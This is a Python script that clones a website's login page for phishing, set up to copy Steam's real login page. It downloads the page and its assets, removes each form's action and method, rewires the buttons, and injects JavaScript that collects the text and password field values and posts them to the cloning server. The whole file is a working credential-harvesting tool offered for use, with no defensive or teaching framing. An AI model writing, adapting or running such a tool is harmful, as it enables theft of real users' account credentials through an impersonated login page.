from bs4 import BeautifulSoup
from requests import Session,get
from urllib.request import urlopen
import os
import re
from time import sleep

class Cloner:

    def __init__(self,site,basePath):
        self.basePath = basePath
        self.site = site
        self.baseSite = re.match("(https?://)?([^/]*)",site)[0] + "/"
        self.session = Session()

    def clone(self):
        html = self.download(self.site)
        html = self.linkGenerator(html)
        html = self.findInputs(html)
        self.saveHtml(html)

    """
    return file's data made from url
    """
    def download(self, url):
        return self.session.get(url).content

    # """
    # return file's data made from url
    # """
    # def download(self, url):
    #     return urlopen(url).read()

    """
    create file from data and type of url in path
    """
    def save(self, data, path):
        if not path.startswith('/'):
            path = '/' + path
        path = os.path.relpath(self.basePath + path)
        dirname = os.path.dirname(path)
        if not os.path.exists(dirname) and dirname!="":
            os.makedirs(dirname)

        with open(path, "wb") as file:
            file.write(data)       

    def saveHtml(self, data, path="/index.html"):
        with open(self.basePath + path, "w", encoding="utf-8") as file:
            file.write(data)

    """
    generate a path from url
    """
    def pathGenerator(self, url):
        path = re.match("(https?://)?/?([^?]*)([?].*)?",url)[2]
        return path
    
    """
    generate links from site, and make copies of them in local dir
    """
    def linkGenerator(self,html):
        soup = BeautifulSoup(html, "html.parser")
        links = soup.find_all("link")
        for link in links:
            if not link.get("href",None):
                continue
            url = link['href']
            dest = self.pathGenerator(url)

            if not url.startswith("http"):
                base = True
                url = self.baseSite + url
            else:
                base = False
            data = self.download(url)
            # print(f'link:{link}\n dest={dest}')
            try:
                self.save(data,dest)
                link["href"] = dest if not base else "/"+dest
            except: 
                print(f"failed at saving data from url:{url} at {dest}")

        items = soup.find_all(src=True)
        for item in items:
            if not item.get("src",None): 
                continue
            url = item['src']
            dest = self.pathGenerator(url)

            if not url.startswith("http"):
                base = True
                url = self.baseSite + url
            else:
                base = False
            data = self.download(url)
            # print(f'script:{script}\n dest={dest}')
            try:
                self.save(data,dest)
                item["src"] = dest if not base else "/"+dest
            except:
                print(f"failed at saving data from url:{url} at {dest}")
        return str(soup)

    def findInputs(self,html):
        soup = BeautifulSoup(html, "html.parser")
        forms = soup.find_all("form")

        for form in forms:
            if (hasattr(form,"method")):
                del form["method"]
            if (hasattr(form,"action")):
                del form["action"]

        data = {}
        
        inputs = soup.find_all("input",type="text") + soup.find_all("input",type="password")
        
        for inp in inputs:
            if not inp.get("id",None):
                continue
            name = inp["name"] if inp.get("name", None) else inp["id"]
            value = f"document.getElementById('{inp['id']}').value"
            data[name] = value

        buttons = soup.find_all("button")
        for button in buttons:
            bType = button.get("type",None)
            if bType: del button["type"]
            button["onclick"] = "___send()"
                
        js = """
            function ___location() {
                return window.location.href.match(/^(.*\/\/.*?)(\/.*?)$/)[1];
            }

            function ___params() {
                return { """ +  ",".join(f"{k}:{v}" for k,v in data.items()) + """ 
                }
            }

            function ___post(path, params) {
                // The rest of this code assumes you are not using a library.
                // It can be made less wordy if you use one.
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = path;

                for (const key in params) {
                    if (params.hasOwnProperty(key)) {
                        const hiddenField = document.createElement('input');
                        hiddenField.type = 'hidden';
                        hiddenField.name = key;
                        hiddenField.value = params[key];

                        form.appendChild(hiddenField);
                    }
                }
                document.body.appendChild(form);
                form.submit();
            }

            function ___send() {
                ___post(___location(),___params());
            }
        """
        tag = soup.new_tag("script")
        tag.insert(1,js)
        soup.body.append(tag)
        return str(soup)

        
# def main():
#     site = "https://store.steampowered.com/login/"
#     cloner = Cloner(site,"steam")
#     cloner.clone()

def main():
    site = "https://store.steampowered.com/login/"
    cloner = Cloner(site,"steam")
    cloner.clone()

if __name__=="__main__":
    main()
